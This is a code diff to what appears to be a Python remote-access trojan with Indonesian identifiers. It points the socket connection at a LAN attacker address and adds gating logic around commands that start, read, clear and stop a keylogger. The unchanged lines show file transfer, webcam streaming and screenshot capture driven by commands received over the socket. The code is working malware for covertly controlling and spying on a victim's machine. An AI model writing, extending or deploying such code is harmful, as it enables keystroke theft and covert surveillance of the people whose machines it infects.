@@ -22,7 +22,7 @@ import numpy as np
 import ctypes
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = '127.0.0.1'
+ip = '192.168.18.198'
 
 def change_directory(cmd):
     try:
@@ -256,6 +256,7 @@ def terima_perintah():
             continue
 
 def jalankan_perintah():
+    main_keylogger = False
     while True:
         perintah = terima_perintah()
         if perintah == ('exit', 'quit'):
@@ -269,13 +270,26 @@ def jalankan_perintah():
         elif perintah[:6] == 'upload':
             download_file(perintah[7:])
         elif perintah == 'start_log':
-            Keylogger().start_log()
+            main_keylogger = True
+            if main_keylogger:
+                Keylogger().start_log()
+            else:
+                pass
         elif perintah == 'baca_log':
-            log_thread()
+            if main_keylogger:
+                log_thread()
+            else:
+                pass
         elif perintah == 'clear_log':
-            Keylogger().clear_log()
+            if main_keylogger:
+                Keylogger().clear_log()
+            else:
+                pass
         elif perintah == 'stop_log':
-            Keylogger().stop_listener()
+            if not main_keylogger:
+                pass
+            else:
+                Keylogger().stop_listener()
         elif perintah == 'start_cam':
             byte_stream()
         elif perintah == 'screen_shot':
